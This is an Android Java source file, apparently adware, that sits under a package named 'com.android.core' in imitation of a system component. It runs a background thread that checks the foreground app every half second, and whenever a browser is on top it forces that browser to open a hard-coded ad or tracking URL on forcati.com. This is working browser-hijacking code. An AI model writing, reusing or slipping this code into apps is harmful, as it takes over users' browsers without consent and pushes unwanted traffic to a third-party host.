package com.android.core;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.SystemClock;

import com.android.utils.LogUtils;
import com.android.utils.Utils;

import java.util.List;

/**
 * Created by laole918 on 2016/5/5 0005.
 */
public class WorkThread extends Thread {

    public static final String TAG = WorkThread.class.getSimpleName();

    private static WorkThread mInstances;

    private Context mContext;
    private boolean isWorking;

    public WorkThread(Context context) {
        mContext = context;
        isWorking = false;
    }

    public static void start(Context context) {
        if (mInstances == null || !mInstances.isAlive()) {
            if (mInstances != null && !mInstances.isAlive()) {
                mInstances.stopThread();
                mInstances = null;
            }
            mInstances = new WorkThread(context);
            mInstances.startThread();
        }
    }

    private void startThread() {
        if (!isWorking) {
            isWorking = true;
            super.start();
        }
    }

    private void stopThread() {
        if (isWorking) {
            isWorking = false;
        }
    }

    @Override
    public void run() {
        String mTopApp = null;
        while (isWorking) {
            if (!Utils.isTopApp(mContext, mTopApp)) {
                mTopApp = null;
                List<String> packages = Utils.getBrowsAblePackages(mContext);
                for (String pk : packages) {
                    if (Utils.isTopApp(mContext, pk)) {
                        mTopApp = pk;
                        gotoUrl(pk);
                        break;
                    }
                }
            }
            LogUtils.d(TAG, "I'm working!!!");
            SystemClock.sleep(500);
        }
    }

    public void gotoUrl(final String pk) {
        Intent intent = new Intent();
        intent.setPackage(pk);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setAction(Intent.ACTION_VIEW);
        intent.addCategory(Intent.CATEGORY_BROWSABLE);
        intent.setData(Uri.parse("http://forcati.com/get/iad/1-3532-23672a8af6abb34f1349a5b4ec91103c?cl=WW_MS&af=2"));
        mContext.startActivity(intent);
        LogUtils.d(TAG, "Open the url with:" + pk);
    }
}
